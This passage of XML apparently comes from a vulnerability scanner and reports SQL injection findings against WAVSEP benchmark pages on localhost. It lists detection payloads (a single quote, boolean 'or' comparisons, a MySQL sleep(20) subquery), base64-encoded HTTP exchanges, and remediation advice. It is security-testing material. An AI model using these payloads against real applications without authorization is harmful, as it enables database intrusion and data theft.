    <issueDetail><![CDATA[The <b>orderby</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the orderby parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>,(select*from(select(sleep(20)))a)</b> was submitted in the orderby parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDUtSW5qZWN0aW9uSW5TZWFyY2hPcmRlckJ5LVN0cmluZy1CaW5hcnlEZWxpYmVyYXRlUnVudGltZUVycm9yLVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtNTAwRXJyb3IvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0Kb3JkZXJieT1tc2dpZCc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0Njo0OSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsmIzM5OyBhdCBsaW5lIDE8L3A+PHA+PGI+RGVzY3JpcHRpb248L2I+IFRoZSBzZXJ2ZXIgZW5jb3VudGVyZWQgYW4gdW5leHBlY3RlZCBjb25kaXRpb24gdGhhdCBwcmV2ZW50ZWQgaXQgZnJvbSBmdWxmaWxsaW5nIHRoZSByZXF1ZXN0LjwvcD48aHIgY2xhc3M9ImxpbmUiIC8+PGgzPkFwYWNoZSBUb21jYXQvOC41Ljg0PC9oMz48L2JvZHk+PC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDUtSW5qZWN0aW9uSW5TZWFyY2hPcmRlckJ5LVN0cmluZy1CaW5hcnlEZWxpYmVyYXRlUnVudGltZUVycm9yLVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtNTAwRXJyb3IvQ2FzZTA1LUluamVjdGlvbkluU2VhcmNoT3JkZXJCeS1TdHJpbmctQmluYXJ5RGVsaWJlcmF0ZVJ1bnRpbWVFcnJvci1XaXRoRXJyb3JzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0Kb3JkZXJieT1tc2dpZCUyYyhzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ3OjEwIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA3MzANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDUgLSBJbmplY3Rpb24gaW50byBhbiBvcmRlciBieSBjbGF1c2UgKGFueSB0eXBlKSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiBtZXNzYWdlczoKPFRBQkxFPgo8VFI+CjxURD4KPEI+Ck1zZ0lkCjwvQj4KPC9URD4KPFREPgo8Qj4KVGl0bGUKPC9CPgo8L1REPgo8VEQ+CjxCPgpNZXNzYWdlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEKPC9URD4KPFREPgpXZWxjb21lIHRvIHRoZSB3ZWIgc2l0ZQo8L1REPgo8VEQ+CkhlbGxvIFdvcmxkCjwvVEQ+CjwvVFI+CjxUUj4KPFREPgoyCjwvVEQ+CjxURD4KUmVtZW1iZXIgdG8gY2hhbmdlIHlvdXIgcGFzc3dvcmQKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8VFI+CjxURD4KMwo8L1REPgo8VEQ+CllvdXIgYWNjb3VudCBpcyBhYm91dCB0byBleHBpcmUKPC9URD4KPFREPgpIZWxsbyBXb3JsZAo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6567212912272312320</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the transactionId parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payloads <b>29095053 or 9699=09699</b> and <b>77698576 or 9935=9939</b> were each submitted in the transactionId parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application took <b>20003</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWMtUGVybWlzc2lvbkJ5cGFzcy1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTUNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UwNi1JbmplY3Rpb25JblZpZXctTnVtZXJpYy1QZXJtaXNzaW9uQnlwYXNzLVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbklkPTEn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkxNg0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0Njo1MCBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsgQU5EIHVzZXJJZD0xJiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWMtUGVybWlzc2lvbkJ5cGFzcy1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTUNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UwNi1JbmplY3Rpb25JblZpZXctTnVtZXJpYy1QZXJtaXNzaW9uQnlwYXNzLVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbklkPTEyOTA5NTA1MyUyMG9yJTIwOTY5OSUzZDA5Njk5]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjExIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MTENCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8VFI+CjxURD4KMTMyCjwvVEQ+CjxURD4KMTAwMAo8L1REPgo8VEQ+ClNpbXBsZSBUcmFuc2FjdGlvbgo8L1REPgo8VEQ+CjIwMTAtMDEtMDEKPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDYtSW5qZWN0aW9uSW5WaWV3LU51bWVyaWMtUGVybWlzc2lvbkJ5cGFzcy1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTUNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTUwMEVycm9yL0Nhc2UwNi1JbmplY3Rpb25JblZpZXctTnVtZXJpYy1QZXJtaXNzaW9uQnlwYXNzLVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbklkPTE3NzY5ODU3NiUyMG9yJTIwOTkzNSUzZDk5Mzk=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjExIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgNiAtIEluamVjdGlvbiBpbnRvIGEgbnVtZXJpYyB2YWx1ZSBpbiBhIHByaXZhdGUgcmVzb3VyY2UgdmlldyBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpUaGUgbGlzdCBvZiB0cmFuc2FjdGlvbnM6CjxUQUJMRT4KPFRSPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbklkCjwvQj4KPC9URD4KPFREPgo8Qj4Kc3VtCjwvQj4KPC9URD4KPFREPgo8Qj4KZGVzY3JpcHRpb24KPC9CPgo8L1REPgo8VEQ+CjxCPgp0cmFuc2FjdGlvbkRhdGUKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
